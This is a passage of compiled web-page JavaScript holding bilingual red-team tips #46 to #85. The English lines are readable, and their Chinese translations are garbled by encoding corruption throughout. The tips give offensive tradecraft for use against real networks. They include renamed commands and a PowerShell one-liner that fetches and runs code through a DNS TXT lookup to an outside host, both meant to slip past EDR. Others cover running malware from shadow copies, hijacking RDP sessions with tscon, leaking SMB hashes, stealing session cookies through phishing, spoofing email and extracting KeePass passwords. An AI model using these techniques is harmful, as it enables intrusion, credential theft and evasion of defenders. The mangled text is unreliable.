VDI? Check out C:\\ and other disks for potentially sensitive files other users may have saved there."),s("br"),e._v("\nçº¢é˜Ÿæç¤º #46: åœ¨è™šæ‹Ÿæ¡Œé¢\bæ¶æ„ï¼ˆVDIï¼‰ä¸­ï¼Ÿæ£€æŸ¥Cç›˜å’Œå…¶ä»–ç£ç›˜ä¸Šæ˜¯å¦æœ‰å…¶ä»–ç”¨æˆ·å¯èƒ½å·²ä¿å­˜åœ¨å…¶ä¸­çš„æ½œåœ¨æ•æ„Ÿæ–‡ä»¶ã€‚")]),e._v(" "),s("p",[e._v("Red tip #47: Incase EDR are looking for "),s("code",[e._v("net users /domain")]),e._v(" try using "),s("code",[e._v("net use /dom")]),s("br"),e._v("\nçº¢é˜Ÿæç¤º #47: é˜²æ­¢EDRé€šè¿‡å¯»æ‰¾"),s("code",[e._v("net users /domain")]),e._v(" æ£€æµ‹ï¼Œè¯·å°è¯•ä½¿ç”¨"),s("code",[e._v("net use /dom")])]),e._v(" "),s("p",[e._v("Red tip #48: Is EDR potentially looking for "),s("code",[e._v("powershell -encodedcommand")]),e._v("? Try "),s("code",[e._v("powershell -ec")]),s("br"),e._v("\nçº¢é˜Ÿæç¤º #48:EDRæ˜¯å¦åœ¨å¯»æ‰¾"),s("code",[e._v("powershell -encodedcommand")]),e._v("ï¼Ÿå°è¯•ä½¿ç”¨"),s("code",[e._v("powershell -ec")])]),e._v(" "),s("p",[e._v("Red tip #49: Attacking a heavy Macintosh or Linux estate? Send a Office Maldoc with OS checking logic to obtain footholds on either system"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #49:æ”»å‡»Macintoshæˆ–Linuxèµ„äº§ï¼Ÿå‘é€å¸¦æœ‰æ“ä½œç³»ç»Ÿæ£€æŸ¥é€»è¾‘çš„Office Maldocä»¥è·å–ä»»ä¸€ç³»ç»Ÿçš„æƒé™ã€‚")]),e._v(" "),s("p",[e._v("Red tip #50: Carbon Black checks for IEX and web req commands. Use "),s("code",[e._v("powershell powershell . (nslookup -q=txt calc.vincentyiu.co.uk )[-1]")]),s("br"),e._v("\nçº¢é˜Ÿæç¤º #50: Carbon Blackæ£€æŸ¥IEXå’ŒWeb reqå‘½ä»¤ã€‚\bä½¿ç”¨powershellå‘½ä»¤è¡Œ"),s("code",[e._v("powershell . (nslookup -q=txt calc.vincentyiu.co.uk )[-1]")])]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("p",[e._v("Carbon Blackä¸“æ³¨äºæä¾›ç»ˆç«¯APTé˜²æŠ¤è§£å†³æ–¹æ¡ˆï¼Œåœ¨ç»ˆç«¯å¨èƒåˆ†æä¸é˜²æŠ¤å“åº”æ–¹é¢ç‹¬æ ‘ä¸€å¸œã€‚")])]),e._v(" "),s("h3",{attrs:{id:"_51-60"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_51-60","aria-hidden":"true"}},[e._v("#")]),e._v(" 51-60")]),e._v(" "),s("p",[e._v("Red tip #51: Cant open C drive? Try "),s("code",[e._v("\\\\127.0.0.1\\c$")]),s("br"),e._v("\nçº¢é˜Ÿæç¤º #51: ä¸èƒ½æ‰“å¼€Cç›˜ï¼Ÿå°è¯•"),s("code",[e._v("\\\\127.0.0.1\\c$")])]),e._v(" "),s("p",[e._v("Red tip #52: SC doesnt take credentials. Cant use runas? Try "),s("code",[e._v("net use \\\\targetip\\ipc$ password /u:domain\\username")]),e._v(" then "),s("code",[e._v("sc")]),e._v(" to psexec"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #52: SC\bæ²¡æœ‰ç™»å½•å‡­è¯ã€‚ä¸èƒ½ä½¿ç”¨runasï¼Ÿ è¯•è¯•"),s("code",[e._v("net use \\\\targetip\\ipc$ password /u:domain\\username")]),e._v("ç„¶åå†æ‰§è¡Œ "),s("code",[e._v("sc")]),e._v(" è½¬ä¸º "),s("code",[e._v("psexec")]),e._v(".")]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("p",[e._v("åœ¨windowsç³»ç»Ÿå‘½ä»¤æç¤ºç¬¦ä¸­ï¼Œæœ‰ä¸€ä¸ªSCå·¥å…·å‘½ä»¤é›†ã€‚è¯¥å·¥å…·é›†ä¸»è¦ç”¨æ¥å¯¹æ“ä½œç³»ç»ŸæœåŠ¡è¿›è¡Œç®¡ç†ï¼Œè¯¥å‘½ä»¤æ˜¯ç”±serviceä¸€è¯ï¼Œç®€åŒ–è€Œæ¥çš„ã€‚\nsc \\server start ServiceName\nsc \\server stop ServiceName\nnet use \\server password /USER:user #æ²¡æœ‰â€œç™»å½•â€ä¿¡æ¯ï¼Œæ‰€ä»¥å¯èƒ½éœ€è¦æ‰§è¡Œ\nscä¸psexecç›¸æ¯”çš„ä¸€ä¸ªä¼˜ç‚¹æ˜¯è¿œç¨‹è®¡ç®—æœºä¸­æ²¡æœ‰æ˜¾ç¤ºæ§åˆ¶å°çª—å£ã€‚")])]),e._v(" "),s("p",[e._v("Red tip #53: When stick phishing for 2FA, consider using @mrgretzky Evilginx project which logs cookies.   https://breakdev.org/evilginx-1-1-release/"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #53: å½“é’“é±¼2FA(åŒå› ç´ )æ—¶ï¼Œè€ƒè™‘ä½¿ç”¨@mrgretzky evilginx projectæ¥è·å–cookiesã€‚https://breakdev.org/evilginx-1-1-å‘å¸ƒ/")]),e._v(" "),s("p",[e._v("Red tip #54: Hide from blue. Volume shadow copy then execute "),s("code",[e._v("\\\\ \\GLOBALROOT\\Device\\HarddiskVolumeShadowColy1\\malware.exe/dll")]),e._v(" then delete VSC"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #54: èº²å¼€è“é˜Ÿã€‚Volume shadow copyç„¶åæ‰§è¡Œ "),s("code",[e._v("\\\\ \\GLOBALROOT\\Device\\HarddiskVolumeShadowColy1\\malware.exe/dll")]),e._v("ç„¶ååˆ é™¤VSC(Volume shadow copy)")]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("ul",[s("li",[e._v("è²Œä¼¼æ˜¯åˆ©ç”¨Volume shadow copyæ¥åŠ è½½payloadã€‚")]),e._v(" "),s("li",[e._v("å·å½±å¤åˆ¶æœåŠ¡ï¼ˆVolumeShadowCopyServiceï¼‰æ˜¯å¾®è½¯Windowsçš„ä¸€é¡¹ç»„ä»¶æœåŠ¡ï¼Œä»WindowsXPå¼€å§‹æ”¯æŒã€‚å·å½±å¤åˆ¶æœåŠ¡æ˜¯ä¸€é¡¹å®šæ—¶ä¸ºåˆ†å·ä½œå¤åˆ¶çš„æœåŠ¡ã€‚æœåŠ¡ä¼šåœ¨åˆ†å·æ–°å¢ä¸€ä¸ªåä¸ºâ€œé˜´å½±å¤åˆ¶â€ï¼ˆShadowCopyï¼‰çš„é€‰é¡¹ã€‚")]),e._v(" "),s("li",[e._v("å¾®è½¯ï¼š ç®¡ç†åŠæ‰§è¡Œç”¨æ–¼å¤‡ä»½å’Œå…¶ä»–ç›®çš„çš„ç£ç¢ŸåŒºå·å½±ã€‚å¦‚æœè¿™ä¸ªæœåŠ¡è¢«åœæ­¢ï¼Œ\nå·å½±å°†æ— æ³•ç”¨æ–¼å¤‡ä»½ï¼Œå¤‡ä»½å¯èƒ½ä¼šå¤±è´¥ã€‚å¦‚æœè¿™ä¸ªæœåŠ¡è¢«åœç”¨ï¼Œä¾å­˜å®ƒçš„æœåŠ¡æ— æ³•å¯åŠ¨ã€‚")]),e._v(" "),s("li",[e._v("è¡¥å……ï¼š å¦‚ä¸Šæ‰€è¯´çš„ï¼Œç”¨æ¥å¤‡ä»½çš„ä¸œè¥¿ï¼Œå¦‚ MS Backup ç¨‹å¼å°±éœ€è¦è¿™ä¸ªæœåŠ¡")]),e._v(" "),s("li",[e._v("ä¾å­˜ï¼š Remote Procedure Call (RPC)")])])]),e._v(" "),s("p",[e._v("Red tip #55: SMB hash leaking using a UNC path for image in page for drive by leak can give you credentials for less mature environments."),s("br"),e._v("\nçº¢é˜Ÿæç¤º #55: ä½¿ç”¨å›¾åƒé“¾æ¥çš„UNCè·¯å¾„æ³¨å…¥è¿›è¡Œsmb hashæ³„æ¼ï¼Œå¯ä»¥åœ¨ä¸å¤ªæˆç†Ÿçš„ç¯å¢ƒè·å–å‡­æ®ã€‚")]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("ul",[s("li",[s("a",{attrs:{href:"https://www.secpulse.com/archives/68334.html",target:"_blank",rel:"noopener noreferrer"}},[e._v("å›¾åƒé“¾æ¥çš„UNCè·¯å¾„æ³¨å…¥"),s("OutboundLink")],1)]),e._v(" "),s("li",[s("a",{attrs:{href:"https://pentestlab.blog/2017/12/18/microsoft-office-ntlm-hashes-via-frameset/",target:"_blank",rel:"noopener noreferrer"}},[e._v("ï¼ˆæ¨èï¼‰å›¾åƒé“¾æ¥çš„UNCè·¯å¾„æ³¨å…¥_åŸæ–‡"),s("OutboundLink")],1)]),e._v(" "),s("li",[e._v("ä¸tip #32 ç±»ä¼¼")])])]),e._v(" "),s("p",[e._v("Red tip #56: Target victims using email authentication such as Microsoft Account on Windows 10? Hash leak exposes full email address!"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #56ï¼š\bç„å‡†ä½¿ç”¨ç”µå­é‚®ä»¶èº«ä»½éªŒè¯ï¼ˆå¦‚Windows 10ä¸Šçš„Microsoftå¸æˆ·ï¼‰çš„å—å®³è€…ï¼ŸHashæ³„æ¼æš´éœ²å®Œæ•´çš„ç”µå­é‚®ä»¶åœ°å€ï¼")]),e._v(" "),s("p",[e._v("Red tip #57: Working in teams yields better results; and best of all Makes Offensive operations more fun and keeps the adrenaline pumping"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #57ï¼š å›¢é˜Ÿåˆä½œä¼šäº§ç”Ÿæ›´å¥½çš„æ•ˆæœï¼›æœ€é‡è¦çš„æ˜¯ï¼Œè®©è¿›æ”»æ€§çš„è¡ŒåŠ¨æ›´æœ‰è¶£ï¼Œå¹¶ä¿æŒæ–—å¿—æ˜‚æ‰¬ã€‚")]),e._v(" "),s("p",[e._v('Red tip #58: Discuss business targets and objectives with your clients. This process should set non technical goals such as "ATM spit money"'),s("br"),e._v("\nçº¢é˜Ÿæç¤º #58ï¼š ä¸å®¢æˆ·è®¨è®ºä¸šåŠ¡ç›®æ ‡ã€‚è¿™ä¸ªè¿‡ç¨‹åº”è¯¥è®¾å®šéæŠ€æœ¯æ€§çš„ç›®æ ‡ï¼Œæ¯”å¦‚â€œATMåé’±â€")]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("ul",[s("li",[e._v("\bå¯¹äºéæŠ€æœ¯é¢†åŸŸçš„å®¢æˆ·ï¼Œè¿™äº›æ›´èƒ½å¼•èµ·ä»–ä»¬çš„ç†è§£æˆ–å…³æ³¨å§")])])]),e._v(" "),s("p",[e._v("Red tip #59: Checking whether a server or host is good for egress? Likely to go down? "),s("code",[e._v("systeminfo | findstr /i boot")]),s("br"),e._v("\nçº¢é˜Ÿæç¤º #59ï¼šæ£€æŸ¥æœåŠ¡å™¨æˆ–ä¸»æœºæ˜¯å¦é€‚åˆå¤–è¿ï¼Ÿå¯èƒ½ä¼š\bå…³æœºï¼Ÿ"),s("code",[e._v("systeminfo | findstr /i boot")])]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("p",[e._v("\bæ˜¾ç¤ºæœºå™¨å¯åŠ¨æ—¶é—´\n"),s("code",[e._v("systeminfo | findstr /i boot")])])]),e._v(" "),s("p",[e._v("Red tip #60: Type "),s("code",[e._v("query user")]),e._v(" to see who else is connected to the machine."),s("br"),e._v("\nçº¢é˜Ÿæç¤º #60: é”®å…¥"),s("code",[e._v("query user")]),e._v("ä»¥æŸ¥çœ‹è¿˜æœ‰è°è¿æ¥åˆ°äº†è®¡ç®—æœºã€‚")]),e._v(" "),s("h3",{attrs:{id:"_61-70"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_61-70","aria-hidden":"true"}},[e._v("#")]),e._v(" 61-70")]),e._v(" "),s("p",[e._v("Red tip #61: Get a quick patch list using "),s("code",[e._v("wmic qfe list brief")]),e._v(". Cross ref KB to bulletins."),s("br"),e._v("\nçº¢é˜Ÿæç¤º #61: ä½¿ç”¨"),s("code",[e._v("wmic qfe list brief")]),e._v("è·å¾—å¿«é€Ÿè¡¥ä¸åˆ—è¡¨ã€‚é€šè¿‡å…³è”KBå·æŸ¥çœ‹è¡¥ä¸å…¬å‘Šã€‚")]),e._v(" "),s("p",[e._v("Red tip #62: Found a process of interest? Dont forget to obtain a MiniDump! Use Out-MiniDump https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #62:  æ‰¾åˆ°äº†æ„Ÿå…´è¶£çš„è¿›ç¨‹ï¼Ÿä¸è¦å¿˜è®°è·å¾—MiniDumpï¼ä½¿ç”¨"),s("a",{attrs:{href:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1",target:"_blank",rel:"noopener noreferrer"}},[e._v("Out-MiniDump"),s("OutboundLink")],1)]),e._v(" "),s("p",[e._v("Red tip #63: Finally in CyberArk, click policies and see safes but no account? Go to accounts search and search for empty and safes show up"),s("br"),e._v('\nçº¢é˜Ÿæç¤º #63: æœ€åï¼Œåœ¨Cyberâ€‹â€‹Arkä¸­ï¼Œå•å‡»"policies"å¹¶æŸ¥çœ‹"safes"ï¼Œä½†æ²¡æœ‰å¸æˆ·ï¼Ÿè½¬åˆ°å¸æˆ·â€œæœç´¢â€ï¼Œç„¶åæœç´¢ç©ºçš„"safes"')]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("ul",[s("li",[e._v("CyberArkæ˜¯ä¸€å®¶ä¸“æ³¨äºç‰¹æƒè®¿é—®å®‰å…¨çš„ä¸Šå¸‚å…¬å¸ï¼Œå¹¶è¢«Gartnerè¯„ä¸ºâ€œç‰¹æƒè®¿é—®ç®¡ç†â€é¢†åŸŸçš„â€œé¢†å¯¼è€…â€ã€‚")]),e._v(" "),s("li",[e._v("æ²¡ç”¨è¿‡ï¼Œä¸è§£")])])]),e._v(" "),s("p",[e._v("Red tip #64: Is WebDav allowed through the gateway? Using http mini redirector? Dont exfiltrate or send in files. WebDav is subject to DLP"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #64: ç½‘å…³å…è®¸WebDavå—ï¼Ÿä½¿ç”¨http minié‡å®šå‘ç¨‹åºï¼Ÿä¸è¦æ³„éœ²æˆ–å‘é€æ–‡ä»¶ã€‚ WebDavé¡»éµå®ˆDLP")]),e._v(" "),s("ul",[s("li",[e._v("ä¸è§£")])]),e._v(" "),s("p",[e._v("Red tip #65: WebDav mini http redirector: "),s("code",[e._v("net use * http://totallylegit.com/share")]),e._v(" then "),s("code",[e._v("start z:")]),s("br"),e._v("\nçº¢é˜Ÿæç¤º #65: WebDav mini httpé‡å®šå‘å™¨ï¼š"),s("code",[e._v("net use * http://totallylegit.com/share")]),e._v("ï¼Œç„¶å"),s("code",[e._v("start zï¼š")])]),e._v(" "),s("ul",[s("li",[e._v("ä¸è§£")])]),e._v(" "),s("p",[e._v("Red tip #66: Found potential MQ creds? ActiveMQ? Try out https://github.com/fmtn/a , works to query MQ endpoints that dont use self signed crt"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #66:  æ‰¾åˆ°äº†æ½œåœ¨çš„MQå‡­è¯ï¼Ÿ ActiveMQï¼Ÿè¯•ç”¨https://github.com/fmtn/aï¼Œç”¨äºæŸ¥è¯¢ä¸ä½¿ç”¨è‡ªç­¾åcrtè®¤è¯çš„MQç«¯ç‚¹")]),e._v(" "),s("p",[e._v("Red tip #67: Use vssadmin to list and create volume shadow copies"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #67:  åˆ©ç”¨"),s("strong",[e._v("vssadmin")]),e._v("å»åˆ—å‡ºä»¥åŠåˆ›å»ºâ€˜å·å½±å‰¯æœ¬â€™")]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("ul",[s("li",[s("a",{attrs:{href:"https://docs.microsoft.com/zh-cn/previous-versions/office/exchange-server-2007-technical-articles/ff597980(v=exchg.80)?redirectedfrom=MSDN",target:"_blank",rel:"noopener noreferrer"}},[e._v("vssadminå‘½ä»¤è¡Œ"),s("OutboundLink")],1)]),e._v(" "),s("li",[e._v("tip #54 \bå…³è”")])])]),e._v(" "),s("p",[e._v("Red tip #68: Pivoting into a secure zone that has no DNS or web gateway and need exfil? Netsh port forward pivot UDP 53 to DNS 53 then boom"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #68:  è¿›å…¥æ²¡æœ‰DNSæˆ–Webç½‘å…³ä¸”éœ€è¦é…ç½®çš„å®‰å…¨åŒºåŸŸï¼Ÿ Netshç«¯å£å°†UDP 53è½¬å‘åˆ°DNS 53ï¼Œç„¶åé‡æ–°å¯åŠ¨")]),e._v(" "),s("p",[e._v("Red tip #69: Have blue hidden the ways including winkey+R? Try shift and right click desktop and open command prompt"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #69: è“é˜Ÿå·²ç»éšè—äº†åŒ…æ‹¬ã€winã€‘ +ã€Rã€‘åœ¨å†…çš„æ–¹æ³•å—ï¼Ÿå°è¯•ç§»åŠ¨å¹¶å³é”®å•å‡»æ¡Œé¢æ¥æ‰“å¼€å‘½ä»¤æç¤ºç¬¦.")]),e._v(" "),s("p",[e._v("Red tip #70: Tracked down that putty session? Popped the box? Query user and check the victims logon time and idle times"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #70: è¿½æŸ¥puttyä¼šè¯ï¼Ÿå¼¹å‡ºç›’å­ï¼ŸæŸ¥è¯¢ç”¨æˆ·å¹¶æŸ¥çœ‹å—å®³è€…çš„ç™»å½•æ—¶é—´å’Œç©ºé—²æ—¶é—´")]),e._v(" "),s("h3",{attrs:{id:"_71-80"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_71-80","aria-hidden":"true"}},[e._v("#")]),e._v(" 71-80")]),e._v(" "),s("p",[e._v("Red tip #71: Hijack his Session using "),s("code",[e._v('sc create sesshijack binpath= "cmd.exe /k tscon <ID> /dest:<SESSIONNAME>"')]),e._v(" then use putty session."),s("br"),e._v("\nçº¢é˜Ÿæç¤º #71: ä½¿ç”¨"),s("code",[e._v('sc create sesshijack binpath= "cmd.exe /k tscon <ID> /dest:<SESSIONNAME>"')]),e._v("åŠ«æŒ\bä¼šè¯ï¼Œç„¶ååˆ©ç”¨puttyä¼šè¯.")]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("ul",[s("li",[s("a",{attrs:{href:"https://www.freebuf.com/articles/system/129927.html",target:"_blank",rel:"noopener noreferrer"}},[e._v("ä¼šè¯åŠ«æŒæŠ€æœ¯é€šæ€å…¨éƒ¨Windowsç‰ˆæœ¬"),s("OutboundLink")],1)])])]),e._v(" "),s("p",[e._v("Red tip #72: Most people understand email sec wrong. SPF does not mean not spoofable. SPF does nothing without DMARC."),s("br"),e._v("\nçº¢é˜Ÿæç¤º #72:å¤§å¤šæ•°äººç†è§£é‚®ç®±å®‰å…¨\bå¼•èµ·çš„é—®é¢˜ã€‚SPFä¸æ˜¯æ„å‘³ç€ä¸èƒ½\bè¢«æ¬ºéª—ã€‚åœ¨æ²¡æœ‰DMARCï¼ŒSPFå•¥éƒ½åšä¸äº†ã€‚")]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("ul",[s("li",[e._v("å‘ä»¶äººç­–ç•¥æ¡†æ¶(SPF)èƒ½åŠ å¼ºDNSæœåŠ¡å™¨å®‰å…¨å¹¶é™åˆ¶è°èƒ½ä»¥ä½ çš„åŸŸåå‘å‡ºç”µå­é‚®ä»¶ã€‚SPFå¯é˜²æ­¢åŸŸåæ¬ºéª—ï¼Œä»¤ä½ çš„é‚®ä»¶æœåŠ¡å™¨èƒ½å¤Ÿç¡®å®šé‚®ä»¶æ˜¯ä½•æ—¶ä»å…¶æ‰€ç”¨åŸŸåå‘å‡ºçš„ã€‚SPFç”±3ä¸ªä¸»è¦éƒ¨åˆ†æ„æˆï¼šç­–ç•¥æ¡†æ¶ã€èº«ä»½éªŒè¯æ–¹æ³•ï¼Œä»¥åŠåŒ…å«è¿™äº›ä¿¡æ¯çš„ç‰¹æ®Šé‚®ä»¶å¤´ã€‚")]),e._v(" "),s("li",[e._v("åŸŸåå¯†é’¥è¯†åˆ«é‚®ä»¶(DKIM)åè®®å¯ç¡®ä¿é‚®ä»¶å†…å®¹ä¸è¢«å·çª¥æˆ–ç¯¡æ”¹ã€‚2007å¹´åˆç‰ˆå‡ºç‚‰åå†ç»å¤šæ¬¡ä¿®æ”¹ï¼Œæœ€è¿‘ä¸€æ¬¡æ›´æ–°æ˜¯ä»Šå¹´1æœˆçš„IETFæ ‡å‡†8301ã€‚SFPå’ŒDKIMåœ¨2014å¹´çš„IETFæ ‡å‡†7372ä¸­éƒ½åšäº†æ›´æ–°ã€‚")]),e._v(" "),s("li",[e._v("åŸºäºåŸŸçš„é‚®ä»¶èº«ä»½éªŒè¯ã€æŠ¥å‘ŠåŠä¸€è‡´æ€§(DMARC)åè®®ä»¥ä¸€ç»„åè°ƒä¸€è‡´çš„ç­–ç•¥é»åˆäº†SPFå’ŒDKIMï¼Œå¹¶å°†å‘ä»¶äººåŸŸåä¸é‚®ä»¶å¤´ä¸­From:åŸŸåˆ—å‡ºçš„å†…å®¹ç›¸å…³è”ï¼Œè¿˜å…·å¤‡æ›´å¥½çš„æ”¶ä»¶äººåé¦ˆæœºåˆ¶ã€‚")])])]),e._v(" "),s("p",[e._v("Red tip #73: Weak DMARC on victim org domain? Spoof their own emails back into themselves! You even inherit their AD name and photo.\nçº¢é˜Ÿæç¤º #73: å—å®³è€…åŸŸçš„DMARCå¼±ï¼Ÿ ä¼ªè£…æˆä»–ä»¬è‡ªå·±ï¼ æ‚¨ç”šè‡³å¯ä»¥\bè·å¾—ä»–ä»¬çš„ADåç§°å’Œç…§ç‰‡ã€‚")]),e._v(" "),s("p",[e._v("Red tip #74: Got access to Microsoft OWA mailbox or O365? You can extract global catalog from contacts use @Burp_Suite and parse JSON object"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #74:  \b\bè®¿é—®å¾®è½¯OWAæˆ–office365ï¼Ÿä½ å¯ä»¥åˆ©ç”¨@Burp_Suite æå–è”ç³»äººåˆ†ç±» å¹¶è½¬æˆjsonæ ¼å¼ã€‚")]),e._v(" "),s("p",[e._v("Red tip #75: Write PHP delivery scripts that can mutate your payloads and add unique trackers per download. This tracks file being executed.\nçº¢é˜Ÿæç¤º #75: \bç¼–å†™trackerPHP delivery \bscriptsæ··æ·†\bè½½è·å¹¶åœ¨æ¯æ¬¡ä¸‹è½½æ—¶æ·»åŠ ä¸åŒçš„è·Ÿè¸ªå™¨ .è¿™æ ·çš„è¯\bï¼Œè°ƒè¯•æ–‡ä»¶ä»£ç éœ€è¦æ‰§è¡Œ\bã€‚")]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("p",[e._v("Metasploit's Web Delivery Script is a versatile module that creates a server on the attacking machine which hosts a payload. When the victim connects to the attacking server, the payload will be executed on the victim machine. This exploit requires a method of executing commands on the victim machine.")]),e._v(" "),s("ul",[s("li",[s("a",{attrs:{href:"https://www.jianshu.com/p/b92248a29366",target:"_blank",rel:"noopener noreferrer"}},[e._v("åˆ©ç”¨åœºæ™¯å‚è€ƒ"),s("OutboundLink")],1)])])]),e._v(" "),s("p",[e._v("Red tip #76: Simulating a criminal threat story with smash and grab agenda? Phish users and hot swap payload mid campaign to test formats\nçº¢é˜Ÿæç¤º #76: ç”¨åˆ é™¤å’Œè·å–è®®ç¨‹æ¥æ¨¡æ‹ŸçŠ¯ç½ªå¨èƒæ•…äº‹ï¼Ÿ ä»¥ç½‘ç»œé’“é±¼ç”¨æˆ·å’Œçƒ­æ’æ‹”æœ‰æ•ˆè½½è·æ´»åŠ¨æ¥å®‰æ’æµ‹è¯•")]),e._v(" "),s("p",[e._v("Red tip #77: RCE on a web application for less mature client? "),s("code",[e._v("nslookup -q=srv _ldap._tcp")]),e._v("if its domain joined Invoke-Kerberoast\nçº¢é˜Ÿæç¤º #77:  åœ¨ä¸å®Œå–„çš„\bwebåº”ç”¨å®¢æˆ·ç«¯ä¸ŠRCEï¼Ÿå¦‚æœå…¶åŸŸåŠ å…¥äº†Invoke-Kerberoast "),s("code",[e._v("nslookup -q = srv _ldap._tcp")])]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("ul",[s("li",[e._v("ä¸tip #12 ç±»ä¼¼")])])]),e._v(" "),s("p",[e._v("Red tip #78: @benichmt1 suggests looking for vmdk files across the network. You can use this to potentially access segregated networks"),s("br"),e._v("\nçº¢è‰²æç¤ºï¼ƒ78ï¼š@ benichmt1å»ºè®®åœ¨æ•´ä¸ªç½‘ç»œä¸­æŸ¥æ‰¾vmdkæ–‡ä»¶ã€‚ æ‚¨å¯ä»¥ä½¿ç”¨å®ƒæ¥è®¿é—®éš”ç¦»çš„ç½‘ç»œ")]),e._v(" "),s("p",[e._v("Red tip #79: Obfuscation is never bad, especially when its a button click. @danielhbohannon - https://github.com/danielbohannon"),s("br"),e._v("\nçº¢è‰²æç¤ºï¼ƒ79ï¼šæ··æ·†æ°¸è¿œæ˜¯ä¸é”™çš„é€‰æ‹©ï¼Œå°¤å…¶åœ¨å•å‡»æŒ‰é’®æ—¶ã€‚ @danielhbohannon-https://github.com/danielbohannon")]),e._v(" "),s("p",[e._v("Red tip #80: Need to sweep for uptimes? Use "),s("code",[e._v('wmic /node:"<computer>"')]),e._v(" OS get LastBootUpTime in a for loop"),s("br"),e._v("\nçº¢è‰²æç¤ºï¼ƒ80:éœ€è¦æ‰«ææ­£å¸¸è¿è¡Œæ—¶é—´å—ï¼Ÿä½¿ç”¨ "),s("code",[e._v('wmic /node:"<computer>"')]),e._v("osåœ¨forå¾ªç¯ä¸­è·å–lastbootuptimeã€‚")]),e._v(" "),s("h3",{attrs:{id:"_81-90"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_81-90","aria-hidden":"true"}},[e._v("#")]),e._v(" 81-90")]),e._v(" "),s("p",[e._v("Red tip #81: Looking for systems running KeePass? Run a for loop on "),s("code",[e._v('wmic /node:"host" process list brief')]),e._v(" ğŸ˜ƒ then look at RT #82"),s("br"),e._v("\nçº¢è‰²æç¤ºï¼ƒ81: å¯»æ‰¾è¿è¡ŒKeePassçš„ç³»ç»Ÿï¼Ÿè¿è¡Œforå¾ªç¯æ‰§è¡Œï¼š"),s("code",[e._v('wmic /node:"host" process list brief')]),e._v(":ï¼‰ç„¶åæŸ¥çœ‹RT #82")]),e._v(" "),s("p",[e._v("Red tip #82: Found KeePass running in memory? Use @harmj0y KeeThief to extract password and dl the KDBX - https://github.com/HarmJ0y/KeeThief"),s("br"),e._v("\nçº¢è‰²æç¤ºï¼ƒ82: å‘ç°keepassåœ¨è¿è¡Œï¼Ÿä½¿ç”¨@harmj0yçš„keetiferæå–å¯†ç å¹¶ä¸‹è½½kdbx-https://github.com/harmj0y/keetifer")]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("p",[e._v("KDBXæ–‡ä»¶: KeePasså¯†ç å®‰å…¨åˆ›å»ºçš„æ•°æ®æ–‡ä»¶ç§°ä¸ºKDBXæ–‡ä»¶(KeePass v2 Password Database)")])]),e._v(" "),s("p",[e._v("Red tip #83: Struggling to find a working DB client? Live off the land and use your victims in an RDP session.\nçº¢è‰²æç¤ºï¼ƒ83: æ‰¾ä¸åˆ°å·¥ä½œçš„æ•°æ®åº“å®¢æˆ·ç«¯ï¼Ÿç¦»å¼€è¿™ï¼Œä½¿ç”¨ä½ çš„å—å®³è€…çš„RDPä¼šè¯ã€‚")]),e._v(" "),s("p",[e._v("Red tip #84: Im sure everyone hates Oracle DB but no sweat, you can proxycap sqldeveloper.exe"),s("br"),e._v("\nçº¢è‰²æç¤ºï¼ƒ84: æˆ‘ç¡®ä¿¡æ¯ä¸ªäººéƒ½è®¨åŒOracleDBï¼Œä½†æ˜¯ä¸è¦æ‹…å¿ƒï¼Œæ‚¨å¯ä»¥proxycap é‡å®šå‘sqldeveloper.exe")]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("p",[e._v("ProxyCap enables you to redirect your computer's network connections through proxy servers. You can tell ProxyCap which applications will connect to the Internet through a proxy and under what circumstances. This is done through a user friendly interface, without the need to reconfigure any of your Internet clients. ProxyCap has native support for the SSH protocol, allowing you to specify a SSH server as the proxy server.")])]),e._v(" "),s("p",[e._v("Red tip #85: Check the users calendars before using persistence on their machine. They may be out of office and screw your master plans."),s("br"),e._v("\nçº¢è‰²æç¤ºï¼ƒ85: 